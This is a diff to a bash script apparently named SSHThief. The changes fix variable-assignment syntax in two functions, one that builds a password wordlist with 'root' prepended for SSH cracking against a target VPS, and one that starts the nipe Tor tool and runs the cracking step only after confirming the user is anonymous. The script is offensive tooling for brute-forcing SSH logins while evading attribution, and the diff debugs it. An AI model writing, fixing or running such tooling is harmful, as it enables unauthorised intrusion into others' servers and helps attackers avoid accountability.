@@ -134,7 +134,7 @@ function SSHCRACK()
 	sudo sed -i '1i root' wordlist.txt
 	sudo mv wordlist.txt ~/SSHThief/$vpsip/wordlist
 	cd ~/SSHThief/$vpsip/wordlist
-	WordList = ~/SSHThief/$vpsip/wordlist/wordlist.txt
+	WordList=~/SSHThief/$vpsip/wordlist/wordlist.txt
 	echo "[+] Wordlist created: ~/SSHThief/$vpsip/wordlist/wordlist.txt"
 	echo " "
 	cd ~/SSHThief
@@ -187,21 +187,23 @@ function ANON()
 	# execute nipe in nipe folder
 	cd ~/SSHThief/nipe
 	sudo perl nipe.pl start
+	sudo perl nipe.pl stop
+	sudo perl nipe.pl start
 	
 	### ANONYMITY CHECK
 	sudo perl nipe.pl status
 	# if nipestatus shows "activated", user is anonymous
-	nipestatus = $(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')
+	nipestatus="$(sudo perl nipe.pl status | grep activated | awk '{print $3}' | awk -F. '{print $1}')"
 	if [ "$nipestatus" == "activated" ]
 	then
-		# tell user that he is anonymous
+		### PROCEED
 		echo " "
 		echo "[+] ANONYMITY CHECK: You are currently anonymous."
 		echo " "
 		# after anonymity check, call the SSHCRACK function
 		SSHCRACK
 	else
-		# tell user that he is not anonymous, and exit script
+		### EXIT
 		echo " "
 		echo "[-] ANONYMITY CHECK: You are currently not anonymous."
 		echo " "
